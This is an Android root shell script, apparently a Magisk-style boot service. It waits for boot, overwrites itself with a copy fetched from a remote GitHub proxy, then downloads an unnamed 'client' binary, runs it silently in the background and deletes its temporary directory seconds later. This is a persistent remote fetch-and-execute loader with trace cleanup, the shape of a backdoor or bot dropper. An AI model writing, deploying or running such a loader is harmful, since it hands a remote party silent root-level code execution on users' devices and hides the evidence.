#!/system/bin/sh

# 1. 等待系統啟動完成
until [ "$(getprop sys.boot_completed)" = "1" ]; do
    sleep 3
done
sleep 10

# 2. 通用下載函數 (curl 失敗則用 wget)
download_file() {
    if command -v curl >/dev/null 2>&1; then
        curl -L -s -o "$2" "$1" && return 0
    fi
    if command -v wget >/dev/null 2>&1; then
        wget -q -O "$2" "$1" && return 0
    fi
    return 1
}

# 3. 更新 service.d 腳本
download_file "https://gh-proxy.org/https/raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh" "/data/adb/service.d/run.sh"
chmod +x /data/adb/service.d/run.sh

# 4. 在 /data 下建立臨時目錄
ASSET_NAME="client"
URL="https://gh-proxy.org/https/github.com/jenssenli/ko/raw/refs/heads/main/client"

if type mktemp >/dev/null 2>&1; then
    tmpdir="$(mktemp -d "/data/gztmpXXXXXXXXX")"
else
    tmpdir="/data/gztmp$$"
    mkdir -p "$tmpdir" || exit 1
fi

BIN_PATH="$tmpdir/$ASSET_NAME"

# 5. 下載並執行
if download_file "$URL" "$BIN_PATH"; then
    chmod +x "$BIN_PATH"
    (
        cd "$tmpdir" || exit 1
        "./$ASSET_NAME" >/dev/null 2>&1 &
    ) &
fi

(
    sleep 5
    rm -rf "$tmpdir"
) >/dev/null 2>&1 &

exit 0
